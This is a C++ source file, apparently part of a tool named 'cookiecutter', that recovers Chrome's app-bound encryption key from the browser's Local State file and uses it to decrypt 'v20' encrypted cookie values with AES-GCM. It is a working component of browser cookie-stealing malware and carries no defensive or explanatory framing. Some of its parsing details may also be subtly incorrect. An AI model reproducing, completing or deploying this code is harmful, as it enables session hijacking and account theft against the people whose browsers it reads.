// chrome_v20.cpp — Chrome v130+ app-bound encryption (AES-256-GCM via BCrypt)
#include "cookiecutter.h"
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

namespace {
std::vector<uint8_t> b64decode(const std::string& in) {
    static const char* t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<uint8_t> o; int v=0,b=-8;
    for(char c:in){if(c=='='||c=='\n'||c=='\r'||c==' ')continue;const char* p=strchr(t,c);if(!p)continue;v=(v<<6)|(int)(p-t);b+=6;if(b>=0){o.push_back((v>>b)&0xFF);b-=8;}} return o;
}

bool GetAppBoundKey(const std::wstring& lsPath, std::vector<uint8_t>& key) {
    HANDLE h=CreateFileW(lsPath.c_str(),GENERIC_READ,FILE_SHARE_READ,nullptr,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,nullptr);
    if(h==INVALID_HANDLE_VALUE)return false;DWORD sz=GetFileSize(h,nullptr);if(sz>10*1024*1024){CloseHandle(h);return false;}
    std::string d(sz,0);DWORD rd;ReadFile(h,&d[0],sz,&rd,nullptr);CloseHandle(h);
    const char* ndl="\"app_bound_encrypted_key\":\"";size_t p=d.find(ndl);if(p==std::string::npos)return false;
    p+=strlen(ndl);size_t e=d.find('"',p);if(e==std::string::npos)return false;
    std::vector<uint8_t> raw=b64decode(d.substr(p,e-p));
    if(raw.size()<8||memcmp(raw.data(),"APPB",4))return false;
    std::vector<uint8_t> dp(raw.begin()+4,raw.end()),dec;
    if(!cookiecutter::DPADecrypt(dp,dec)||dec.size()<32)return false;
    key.assign(dec.begin(),dec.begin()+32);return true;
}

bool AesGcmDec(const uint8_t* k,size_t kl,const uint8_t* n,size_t nl,const uint8_t* c,size_t cl,const uint8_t* tg,size_t tl,std::vector<uint8_t>& pt){
    BCRYPT_ALG_HANDLE ha=nullptr;BCRYPT_KEY_HANDLE hk=nullptr;bool ok=false;
    if(BCryptOpenAlgorithmProvider(&ha,BCRYPT_AES_ALGORITHM,nullptr,0))goto done;
    if(BCryptSetProperty(ha,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,sizeof(BCRYPT_CHAIN_MODE_GCM),0))goto done;
    if(BCryptGenerateSymmetricKey(ha,&hk,nullptr,0,(PUCHAR)k,(ULONG)kl,0))goto done;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;BCRYPT_INIT_AUTH_MODE_INFO(ai);
    ai.pbNonce=(PUCHAR)n;ai.cbNonce=(ULONG)nl;ai.pbTag=(PUCHAR)tg;ai.cbTag=(ULONG)tl;
    pt.resize(cl);ULONG ol=0;
    if(BCryptDecrypt(hk,(PUCHAR)c,(ULONG)cl,&ai,nullptr,0,pt.data(),(ULONG)cl,&ol,0)==0){pt.resize(ol);ok=true;}
done:if(hk)BCryptDestroyKey(hk);if(ha)BCryptCloseAlgorithmProvider(ha,0);return ok;
}
} // anon

bool ChromeV20Decrypt(const std::wstring& ls,const std::vector<uint8_t>& ev,std::vector<uint8_t>& pt){
    if(ev.size()<16||ev[0]!='v'||ev[1]!='2'||ev[2]!='0'||ev[3]!=0)return false;
    static std::vector<uint8_t> key;static bool tried=false;
    if(!tried){tried=true;GetAppBoundKey(ls,key);}
    if(key.empty())return false;
    const uint8_t* d=ev.data()+4;size_t dl=ev.size()-4;
    if(dl<12+16)return false;
    return AesGcmDec(key.data(),32,d,12,d+12,dl-12-16,d+12+dl-12-16,16,pt);
}
